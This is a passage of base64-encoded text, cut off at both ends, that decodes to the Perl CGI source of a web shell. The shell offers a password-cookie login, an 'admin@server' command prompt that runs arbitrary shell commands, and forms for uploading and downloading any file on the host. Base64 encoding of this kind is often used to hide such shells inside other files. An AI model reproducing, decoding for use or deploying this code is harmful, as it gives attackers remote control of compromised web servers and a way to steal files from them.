4gY2xvc2VkIGJ5IGZvcmVpZ24gaG9zdC48YnI+PGJyPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCg0KCSZQcmludExvZ2luU2NyZWVuOw0KCSZQcmludExvZ2luRm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KCWV4aXQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBhZ2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQgZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4gDQp7DQoJaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBhc3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCgl7DQoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQoJCSZQcmludFBhZ2VIZWFkZXI7DQoJCXByaW50ICZMaXN0RGlyOw0KCX0NCgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJCSZQcmludExvZ2luU2NyZWVuOw0KCQlpZigkTG9naW5QYXNzd29yZCBuZSAiIikgIyBzb21lIHBhc3N3b3JkIHdhcyBlbnRlcmVkDQoJCXsNCgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KCQl9DQoJCSZQcmludExvZ2luRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJZXhpdDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgY29tbWFuZHMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtDQp7DQoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIjxmb250IGNvbG9yPScjNjZmZjY2Jz5bYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQ8L2ZvbnQ+ICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI1MCIgbmFtZT0iYyI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCJ0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KCW15ICRkaXIgPSAmQWRkTGlua0RpcigiZG93bmxvYWQiKTsgDQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPg0KJFByb21wdCBkb3dubG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KDQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOw0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQokUHJvbXB0IHVwbG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCjxsYWJlbCBmb3I9InVwIj5PdmVyd3JpdGUgaWYgaXQgRXhpc3RzPC9sYWJlbD48YnI+PGJyPg0KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQoNCjwvZm9ybT4NCg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3JpcHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBpcw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCglpZighJFdpbk5UKQ0KCXsNCgkJYWxhcm0oMCk7DQoJCXJldHVybiA8PEVORDsNCjwvdGV4dGFyZWE+DQo8YnI+PGZvbnQgY29sb3I9eWVsbG93Pg0KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLjwvZm9udD4NCjxicj48Zm9udCBzaXplPSc2JyBjb2xvcj1yZWQ+S2lsbGVkIGl0ITwvZm9udD4NCkVORA0KCX0NCn0NCg0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoDQojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJbXkgJHJlc3VsdD0iIjsNCglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMNCgl7DQoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dzZXINCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7DQoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJHJlc3VsdCAuPSA8PEVORDsNClNlbmRpbmcgRmlsZSAkVHJhbnNmZXJGaWxlLi4uPGJyPg0KDQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+DQpFTkQNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgl9DQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdA0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkISI7DQoJCSRyZXN1bHQgLj0gJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbXkgJHJlc3VsdCA9ICIiOw0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCQlleGl0KDEpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQ0KIyB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuDQojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsDQojIHRoZSBmaWxlIGlzIHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCXJldHVybiAmUHJpbnRGaWxlVXBsb2FkRm9ybTsNCg0KCX0NCglteSAkcmVzdWx0PSIiOw0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7DQoJfQ0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQoJew0KCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCgkJew0KCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCgkJCWNsb3NlKFVQTE9BREZJTEUpOw0KCQkJJHJlc3VsdCAuPSAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQkkcmVzdWx0IC49ICJGYWlsZWQ6ICQhPGJyPiI7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rDQojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIERvd25sb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJcmV0dXJuICZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCQ0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCXJldHVybiAmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQ0KIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQ0KIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluDQojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUNCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMNCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCglteSAkcmVzdWx0PSIiOw0KCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCgl7DQoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsNCgkJY2hvcCgkQ3VycmVudERpciA9IGAkQ29tbWFuZGApOw0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KDQoJCSRyZXN1bHQgLj0gIkNvbW1hbmQ6IDxydW4+JFJ1bkNvbW1hbmQgPC9ydW4+PGJyPjx0ZXh0YXJlYSBjb2xzPSckY29scycgcm93cz0nJHJvd3MnIHNwZWxsY2hlY2s9J2ZhbHNlJz4iOw0KCQkjIHh1YXQgdGhvbmcgdGluIGtoaSBjaHV5ZW4gZGVuIDEgdGh1IG11YyBuYW8gZG8hDQoJCSRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIjsNCgkJJHJlc3VsdCAuPSAmUnVuQ21kOw0KCX1lbHNpZigkUnVuQ29tbWFuZCA9fiBtL15ccyplZGl0XHMrKC4rKS8pDQoJew0KCQkkcmVzdWx0IC49ICAmU2F2ZUZpbGVGb3JtOw0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kPC9ydW4+PGJyPjx0ZXh0YXJlYSBpZD0nZGF0YScgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJJHJlc3VsdCAuPSZSdW5DbWQ7DQoJfQ0KCSRyZXN1bHQgLj0gICI8L3RleHRhcmVhPiI7DQoJcmV0dXJuICRyZXN1b